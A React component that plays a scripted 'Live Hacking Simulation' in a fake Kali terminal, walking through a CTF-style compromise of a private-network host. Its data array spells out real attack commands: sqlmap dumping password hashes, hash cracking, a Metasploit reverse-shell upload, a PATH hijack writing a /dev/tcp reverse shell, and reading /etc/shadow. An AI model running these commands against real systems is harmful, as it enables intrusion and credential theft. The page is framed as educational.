"use client"

import { useEffect, useRef, useState } from "react"
import { motion, useInView } from "framer-motion"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Play, Pause, RotateCcw, Terminal, AlertTriangle, Shield, CheckCircle } from "lucide-react"

type SimulationStep = {
  command: string
  output: string[]
  type: "scan" | "exploit" | "info" | "defense" | "success" | "warning" | "error"
  delay: number
}

export default function HackingSimulation() {
  const ref = useRef(null)
  const isInView = useInView(ref, { once: true, amount: 0.3 })
  const [isRunning, setIsRunning] = useState(false)
  const [output, setOutput] = useState<string[]>([])
  const [currentStep, setCurrentStep] = useState(0)
  const [stats, setStats] = useState({
    vulnerabilities: 0,
    exploits: 0,
    defenses: 0,
    progress: 0,
  })
  const outputRef = useRef<HTMLDivElement>(null)

  // Enhanced simulation steps with more realistic commands and outputs
  const simulationSteps: SimulationStep[] = [
    {
      command: "nmap -sS -sV -p- --min-rate 5000 --max-retries 2 -oA scan 192.168.1.10",
      output: [
        "Starting Nmap 7.94 ( https://nmap.org ) at 2025-05-12 03:03 EDT",
        "Nmap scan report for target-server (192.168.1.10)",
        "Host is up (0.0087s latency).",
        "Not shown: 65527 closed tcp ports (reset)",
        "PORT     STATE SERVICE     VERSION",
        "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)",
        "80/tcp   open  http        Apache httpd 2.4.52",
        "443/tcp  open  ssl/https   Apache httpd 2.4.52 ((Ubuntu))",
        "3306/tcp open  mysql       MySQL 8.0.32-0ubuntu0.22.04.2",
        "8080/tcp open  http-proxy  Apache Tomcat 9.0.65",
        "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .",
        "Nmap done: 1 IP address (1 host) up scanned in 12.35 seconds",
      ],
      type: "scan",
      delay: 1000,
    },
    {
      command: "dirb http://192.168.1.10/ /usr/share/wordlists/dirb/common.txt",
      output: [
        "DIRB v2.22",
        "By The Dark Raver",
        "-----------------",
        "START_TIME: Mon May 12 03:04:02 2025",
        "WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt",
        "TARGET: http://192.168.1.10/",
        "GENERATED WORDS: 4612",
        "---- Scanning URL: http://192.168.1.10/ ----",
        "+ http://192.168.1.10/admin (CODE:200|SIZE:1234)",
        "+ http://192.168.1.10/backup (CODE:403|SIZE:287)",
        "+ http://192.168.1.10/cgi-bin/ (CODE:403|SIZE:287)",
        "+ http://192.168.1.10/config (CODE:403|SIZE:287)",
        "+ http://192.168.1.10/dashboard (CODE:302|SIZE:0)",
        "+ http://192.168.1.10/index.php (CODE:200|SIZE:7851)",
        "+ http://192.168.1.10/login.php (CODE:200|SIZE:2541)",
        "+ http://192.168.1.10/server-status (CODE:403|SIZE:287)",
        "END_TIME: Mon May 12 03:04:47 2025",
      ],
      type: "scan",
      delay: 1200,
    },
    {
      command: "nikto -h http://192.168.1.10/",
      output: [
        "- Nikto v2.5.0",
        "--------------------------------------------------------------------",
        "+ Target IP:          192.168.1.10",
        "+ Target Hostname:    target-server",
        "+ Target Port:        80",
        "+ Start Time:         2025-05-12 03:05:12 (GMT-4)",
        "--------------------------------------------------------------------",
        "+ Server: Apache/2.4.52 (Ubuntu)",
        "+ /login.php: Admin login page/section found.",
        "+ Cookie PHPSESSID created without the httponly flag",
        "+ /admin/: This might be interesting...",
        "+ /backup/: Directory indexing found.",
        "+ /config/: Directory indexing found.",
        "+ /admin/index.php: Admin login page/section found.",
        "+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host",
        "+ End Time:           2025-05-12 03:06:01 (GMT-4) (49 seconds)",
        "--------------------------------------------------------------------",
        "+ 1 host(s) tested",
      ],
      type: "scan",
      delay: 1000,
    },
    {
      command: "searchsploit apache 2.4.52",
      output: [
        "----------------------------------------------------------------------------------------------------------------- ---------------------------------",
        " Exploit Title                                                                                                   |  Path",
        "----------------------------------------------------------------------------------------------------------------- ---------------------------------",
        "Apache HTTP Server 2.4.52 - Path Traversal                                                                       | multiple/webapps/50680.py",
        "Apache HTTP Server 2.4.52 mod_lua - Use After Free                                                               | linux/local/50752.py",
        "----------------------------------------------------------------------------------------------------------------- ---------------------------------",
        "Shellcodes: No Results",
      ],
      type: "info",
      delay: 800,
    },
    {
      command: "sqlmap -u 'http://192.168.1.10/dashboard.php?id=1' --dbs --batch",
      output: [
        "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:",
        "---",
        "Parameter: id (GET)",
        "    Type: boolean-based blind",
        "    Title: AND boolean-based blind - WHERE or HAVING clause",
        "    Payload: id=1 AND 5751=5751",
        "    Type: time-based blind",
        "    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
        "    Payload: id=1 AND (SELECT 4523 FROM (SELECT(SLEEP(5)))TmcS)",
        "---",
        "available databases [5]:",
        "[*] information_schema",
        "[*] mysql",
        "[*] performance_schema",
        "[*] sys",
        "[*] webapp_db",
      ],
      type: "exploit",
      delay: 1500,
    },
    {
      command: "sqlmap -u 'http://192.168.1.10/dashboard.php?id=1' -D webapp_db --tables --batch",
      output: [
        "Database: webapp_db",
        "[6 tables]",
        "+-------------+",
        "| config      |",
        "| logs        |",
        "| products    |",
        "| sessions    |",
        "| settings    |",
        "| users       |",
        "+-------------+",
      ],
      type: "exploit",
      delay: 1000,
    },
    {
      command: "sqlmap -u 'http://192.168.1.10/dashboard.php?id=1' -D webapp_db -T users --columns --batch",
      output: [
        "Database: webapp_db",
        "Table: users",
        "[7 columns]",
        "+----------+-------------+",
        "| Column   | Type        |",
        "+----------+-------------+",
        "| id       | int(11)     |",
        "| username | varchar(50) |",
        "| password | varchar(255)|",
        "| email    | varchar(100)|",
        "| role     | varchar(20) |",
        "| created  | datetime    |",
        "| active   | tinyint(1)  |",
        "+----------+-------------+",
      ],
      type: "exploit",
      delay: 1000,
    },
    {
      command:
        "sqlmap -u 'http://192.168.1.10/dashboard.php?id=1' -D webapp_db -T users -C username,password --dump --batch",
      output: [
        "Database: webapp_db",
        "Table: users",
        "[4 entries]",
        "+----------+--------------------------------------------------------------+",
        "| username | password                                                     |",
        "+----------+--------------------------------------------------------------+",
        "| admin    | $2y$10$6e5GkAT0wJaUQJXhvuQYJOQjx/N9uRYqvAP8iBVXbYbgJ3COVXcPW |",
        "| john     | $2y$10$Nt5XmPJJRxiZxMBqpRgBxeQhwB7JxHNHOm4jlBL2A1eJEFbPyqS1q |",
        "| sarah    | $2y$10$QlX5vDYvHqJXJZxz9LYpJeQh8Fvs3KZB5eQyJ5ypJYKMt9BIICV8K |",
        "| guest    | $2y$10$8MpZUYCG0HJjHzeDPQxR6.KlE7lFlA9zB7R0Uexx9Vw4qN1mJzqTy |",
        "+----------+--------------------------------------------------------------+",
      ],
      type: "exploit",
      delay: 1200,
    },
    {
      command: "john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
      output: [
        "Using default input encoding: UTF-8",
        "Loaded 4 password hashes with 4 different salts (bcrypt [Blowfish 32/64 X3])",
        "Cost 1 (iteration count) is 1024 for all loaded hashes",
        "Will run 4 OpenMP threads",
        "Press 'q' or Ctrl-C to abort, almost any other key for status",
        "password123      (admin)",
        "sunshine         (sarah)",
        "qwerty           (guest)",
        "3g4p!Rt          (john)",
        "4g 0:00:12:24 DONE (2025-05-12 03:08) 0.005376g/s 61.44p/s 245.8c/s 245.8C/s",
        'Use the "--show" option to display all of the cracked passwords reliably',
        "Session completed.",
      ],
      type: "success",
      delay: 1500,
    },
    {
      command:
        "hydra -l admin -p password123 192.168.1.10 http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid credentials'",
      output: [
        "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).",
        "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 03:09:12",
        "[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task",
        "[DATA] attacking http-post-form://192.168.1.10:80/login.php:username=^USER^&password=^PASS^:Invalid credentials",
        "[80][http-post-form] host: 192.168.1.10   login: admin   password: password123",
        "[STATUS] attack finished for 192.168.1.10 (valid pair found)",
        "1 of 1 target successfully completed, 1 valid password found",
        "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-12 03:09:15",
      ],
      type: "success",
      delay: 1000,
    },
    {
      command:
        'msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.1.10; set RPORT 8080; set HttpUsername admin; set HttpPassword password123; set payload java/jsp_shell_reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"',
      output: [
        "msf6 > use exploit/multi/http/tomcat_mgr_upload",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.1.10",
        "RHOSTS => 192.168.1.10",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080",
        "RPORT => 8080",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername admin",
        "HttpUsername => admin",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword password123",
        "HttpPassword => password123",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set payload java/jsp_shell_reverse_tcp",
        "payload => java/jsp_shell_reverse_tcp",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.1.100",
        "LHOST => 192.168.1.100",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > set LPORT 4444",
        "LPORT => 4444",
        "msf6 exploit(multi/http/tomcat_mgr_upload) > exploit",
        "[*] Started reverse TCP handler on 192.168.1.100:4444 ",
        "[*] Retrieving session ID and CSRF token...",
        "[*] Uploading and deploying xnLuRzZP7...",
        "[*] Executing xnLuRzZP7...",
        "[*] Sending stage (58829 bytes) to 192.168.1.10",
        "[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:49152) at 2025-05-12 03:10:24 -0400",
        "[*] Session ID: 1",
        "[*] Server username: tomcat",
        "[*] Server version: 9.0.65",
        "[*] Architecture: x86_64",
        "[*] Meterpreter : java/linux",
      ],
      type: "success",
      delay: 2000,
    },
    {
      command: "meterpreter > getuid",
      output: ["Server username: tomcat"],
      type: "info",
      delay: 500,
    },
    {
      command: "meterpreter > sysinfo",
      output: [
        "Computer     : target-server",
        "OS           : Ubuntu 22.04.3 LTS (Linux 5.15.0-91-generic)",
        "Architecture : x86_64",
        "Meterpreter  : java/linux",
      ],
      type: "info",
      delay: 800,
    },
    {
      command: "meterpreter > shell",
      output: ["Process 1 created.", "Channel 1 created."],
      type: "info",
      delay: 500,
    },
    {
      command: "find / -perm -u=s -type f 2>/dev/null",
      output: [
        "/usr/bin/sudo",
        "/usr/bin/pkexec",
        "/usr/bin/passwd",
        "/usr/bin/chfn",
        "/usr/bin/gpasswd",
        "/usr/bin/newgrp",
        "/usr/bin/chsh",
        "/usr/bin/at",
        "/usr/bin/fusermount",
        "/usr/bin/umount",
        "/usr/bin/mount",
        "/usr/bin/su",
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
        "/usr/lib/openssh/ssh-keysign",
        "/usr/lib/policykit-1/polkit-agent-helper-1",
        "/usr/lib/eject/dmcrypt-get-device",
        "/usr/lib/snapd/snap-confine",
        "/usr/sbin/pppd",
        "/usr/local/bin/custom_backup",
      ],
      type: "info",
      delay: 1000,
    },
    {
      command: "ls -la /usr/local/bin/custom_backup",
      output: ["-rwsr-xr-x 1 root root 16712 Feb 15 2025 /usr/local/bin/custom_backup"],
      type: "warning",
      delay: 500,
    },
    {
      command: "strings /usr/local/bin/custom_backup",
      output: [
        "GLIBC_2.2.5",
        "GLIBC_2.34",
        "__gmon_start__",
        "_ITM_deregisterTMCloneTable",
        "_ITM_registerTMCloneTable",
        "system",
        "tar -czvf /tmp/backup.tar.gz /var/www/html/",
        "Backup completed successfully!",
        "Error creating backup",
      ],
      type: "warning",
      delay: 800,
    },
    {
      command:
        "cd /tmp && echo '#!/bin/bash' > tar && echo 'bash -i >& /dev/tcp/192.168.1.100/5555 0>&1' >> tar && chmod +x tar && export PATH=/tmp:$PATH && /usr/local/bin/custom_backup",
      output: ["Backup completed successfully!"],
      type: "exploit",
      delay: 1000,
    },
    {
      command: "# On attacker machine: nc -lvnp 5555",
      output: [
        "Listening on 0.0.0.0 5555",
        "Connection received on 192.168.1.10 49153",
        "bash: cannot set terminal process group (1234): Inappropriate ioctl for device",
        "bash: no job control in this shell",
        "root@target-server:/tmp# id",
        "uid=0(root) gid=0(root) groups=0(root)",
      ],
      type: "success",
      delay: 1200,
    },
    {
      command: "root@target-server:/tmp# cat /etc/shadow | grep root",
      output: [
        "root:$6$tPuRrLlU$wK1Zt9jAytL5C9dPEVPJFPqPsYLNJvhGJHX8P2gkwzeXpI5A5YGFZB9bNxdGfk7YfLxRmYnkHGhZ1rsLKOo.11:19462:0:99999:7:::",
      ],
      type: "success",
      delay: 800,
    },
    {
      command: "root@target-server:/tmp# cat /root/flag.txt",
      output: [
        "Congratulations! You have successfully compromised this system.",
        "",
        "FLAG: CTF{S3cur1ty_1s_4_J0urn3y_n0t_4_D3st1n4t10n}",
        "",
        "Vulnerabilities exploited:",
        "1. SQL Injection in dashboard.php",
        "2. Weak password policy",
        "3. Tomcat Manager accessible with default credentials",
        "4. Custom backup binary with path traversal vulnerability",
        "",
        "Remember to always practice ethical hacking and have proper authorization.",
      ],
      type: "success",
      delay: 1500,
    },
    {
      command: "# System compromised. Implementing security measures...",
      output: [
        "1. Patching SQL injection vulnerability in dashboard.php",
        "2. Implementing strong password policy",
        "3. Restricting access to Tomcat Manager",
        "4. Fixing custom_backup binary",
        "5. Setting up intrusion detection system",
        "6. Configuring firewall rules",
        "7. Implementing regular security audits",
        "8. Setting up automated backups",
        "9. Deploying security monitoring",
        "10. Training staff on security best practices",
      ],
      type: "defense",
      delay: 1500,
    },
  ]

  const resetSimulation = () => {
    setIsRunning(false)
    setOutput([])
    setCurrentStep(0)
    setStats({
      vulnerabilities: 0,
      exploits: 0,
      defenses: 0,
      progress: 0,
    })
  }

  const toggleSimulation = () => {
    setIsRunning(!isRunning)
  }

  useEffect(() => {
    if (!isRunning) return

    let timer: NodeJS.Timeout

    const runStep = () => {
      if (currentStep < simulationSteps.length) {
        const step = simulationSteps[currentStep]

        // Add command to output
        setOutput((prev) => [...prev, `$ ${step.command}`])

        // Update stats based on step type
        setStats((prev) => {
          const newStats = { ...prev }

          if (step.type === "scan" || step.type === "info") {
            newStats.vulnerabilities += 1
          } else if (step.type === "exploit" || step.type === "success") {
            newStats.exploits += 1
          } else if (step.type === "defense") {
            newStats.defenses += 1
          }

          newStats.progress = Math.min(100, Math.round((currentStep / simulationSteps.length) * 100))

          return newStats
        })

        // Add output after a delay
        setTimeout(() => {
          setOutput((prev) => [...prev, ...step.output.map((line) => line)])

          // Scroll to bottom of output
          if (outputRef.current) {
            outputRef.current.scrollTop = outputRef.current.scrollHeight
          }

          // Move to next step
          setCurrentStep(currentStep + 1)

          // Schedule next step
          timer = setTimeout(runStep, step.delay + Math.random() * 500)
        }, 800)
      } else {
        // Simulation complete
        setIsRunning(false)
      }
    }

    timer = setTimeout(runStep, 500)

    return () => {
      clearTimeout(timer)
    }
  }, [isRunning, currentStep])

  // Get icon based on step type
  const getStepIcon = (type: string) => {
    switch (type) {
      case "scan":
        return <Terminal className="h-4 w-4" />
      case "exploit":
        return <AlertTriangle className="h-4 w-4 text-orange-500" />
      case "warning":
        return <AlertTriangle className="h-4 w-4 text-yellow-500" />
      case "error":
        return <AlertTriangle className="h-4 w-4 text-red-500" />
      case "success":
        return <CheckCircle className="h-4 w-4 text-green-500" />
      case "defense":
        return <Shield className="h-4 w-4 text-blue-500" />
      default:
        return <Terminal className="h-4 w-4" />
    }
  }

  // Get line color based on step type
  const getLineColor = (line: string) => {
    if (line.startsWith("$")) return "text-primary font-bold"

    if (
      line.includes("FLAG:") ||
      line.includes("password found") ||
      line.includes("Meterpreter session") ||
      line.includes("uid=0(root)")
    ) {
      return "text-green-500 font-bold"
    }

    if (line.includes("vulnerability") || line.includes("weak") || line.includes("SQL Injection")) {
      return "text-yellow-500"
    }

    if (line.includes("Error") || line.includes("error") || line.includes("failed")) {
      return "text-red-500"
    }

    return "text-green-400"
  }

  return (
    <section className="py-16 md:py-24 relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-b from-background via-muted/10 to-background" />

      <div className="container mx-auto px-4 relative z-10">
        <motion.div
          ref={ref}
          initial={{ opacity: 0, y: 50 }}
          animate={isInView ? { opacity: 1, y: 0 } : { opacity: 0, y: 50 }}
          transition={{ duration: 0.5 }}
          className="max-w-5xl mx-auto"
        >
          <div className="flex flex-col items-center mb-12">
            <motion.div
              initial={{ opacity: 0, scale: 0 }}
              animate={isInView ? { opacity: 1, scale: 1 } : { opacity: 0, scale: 0 }}
              transition={{ duration: 0.5, delay: 0.2 }}
              className="bg-primary/10 p-2 rounded-full mb-4"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="h-6 w-6 text-primary"
              >
                <path d="M20 16V7a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v9m16 0H4m16 0 1.28 2.55a1 1 0 0 1-.9 1.45H3.62a1 1 0 0 1-.9-1.45L4 16" />
                <path d="M8 7v.01M12 7v.01M16 7v.01" />
              </svg>
            </motion.div>
            <h2 className="text-3xl md:text-4xl font-bold text-center">
              Live <span className="text-primary">Hacking</span> Simulation
            </h2>
            <div className="w-20 h-1 bg-primary/30 rounded-full mt-4 mb-8" />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
            <Card className="bg-primary/5 border-primary/20">
              <CardContent className="p-4 flex flex-col items-center justify-center">
                <h3 className="text-lg font-medium mb-2">Progress</h3>
                <div className="text-3xl font-bold">{stats.progress}%</div>
                <div className="w-full bg-muted/30 h-2 rounded-full mt-2 overflow-hidden">
                  <div
                    className="h-full bg-primary rounded-full transition-all duration-500"
                    style={{ width: `${stats.progress}%` }}
                  />
                </div>
              </CardContent>
            </Card>

            <Card className="bg-yellow-500/5 border-yellow-500/20">
              <CardContent className="p-4 flex flex-col items-center justify-center">
                <h3 className="text-lg font-medium mb-2">Vulnerabilities</h3>
                <div className="text-3xl font-bold text-yellow-500">{stats.vulnerabilities}</div>
              </CardContent>
            </Card>

            <Card className="bg-red-500/5 border-red-500/20">
              <CardContent className="p-4 flex flex-col items-center justify-center">
                <h3 className="text-lg font-medium mb-2">Exploits</h3>
                <div className="text-3xl font-bold text-red-500">{stats.exploits}</div>
              </CardContent>
            </Card>

            <Card className="bg-blue-500/5 border-blue-500/20">
              <CardContent className="p-4 flex flex-col items-center justify-center">
                <h3 className="text-lg font-medium mb-2">Defenses</h3>
                <div className="text-3xl font-bold text-blue-500">{stats.defenses}</div>
              </CardContent>
            </Card>
          </div>

          <Card className="border-primary/20 shadow-lg overflow-hidden">
            <CardHeader className="bg-black border-b border-primary/20 flex flex-row justify-between items-center">
              <CardTitle className="text-xl flex items-center gap-2 text-white">
                <span className="text-primary">root@kali</span>:~#
              </CardTitle>
              <div className="flex items-center gap-2">
                <Button
                  variant="outline"
                  size="icon"
                  onClick={toggleSimulation}
                  className="h-8 w-8 border-primary/50 text-primary hover:text-primary-foreground hover:bg-primary/80"
                  disabled={currentStep >= simulationSteps.length}
                >
                  {isRunning ? <Pause className="h-4 w-4" /> : <Play className="h-4 w-4" />}
                </Button>
                <Button
                  variant="outline"
                  size="icon"
                  onClick={resetSimulation}
                  className="h-8 w-8 border-primary/50 text-primary hover:text-primary-foreground hover:bg-primary/80"
                >
                  <RotateCcw className="h-4 w-4" />
                </Button>
              </div>
            </CardHeader>
            <CardContent className="p-0 bg-black">
              <div ref={outputRef} className="font-mono text-sm text-green-500 p-4 h-[400px] overflow-y-auto">
                {output.length === 0 ? (
                  <div className="text-primary/70 mb-2">Click the play button to start the hacking simulation...</div>
                ) : (
                  output.map((line, index) => {
                    // Determine if this is a command line
                    const isCommand = line.startsWith("$")
                    // Get the step type for this line
                    const stepType =
                      isCommand && index > 0
                        ? simulationSteps[Math.min(Math.floor(index / 10), simulationSteps.length - 1)].type
                        : "info"

                    return (
                      <div key={index} className={`${getLineColor(line)} ${isCommand ? "mt-4 mb-1" : "pl-4"}`}>
                        {isCommand && <span className="mr-2 inline-block">{getStepIcon(stepType)}</span>}
                        {line}
                      </div>
                    )
                  })
                )}
                {isRunning && <div className="animate-pulse">▋</div>}
              </div>
            </CardContent>
          </Card>

          <div className="mt-8 text-center text-sm text-muted-foreground">
            <p>
              This is a simulated demonstration of cybersecurity tools and techniques for educational purposes only.
            </p>
          </div>
        </motion.div>
      </div>
    </section>
  )
}
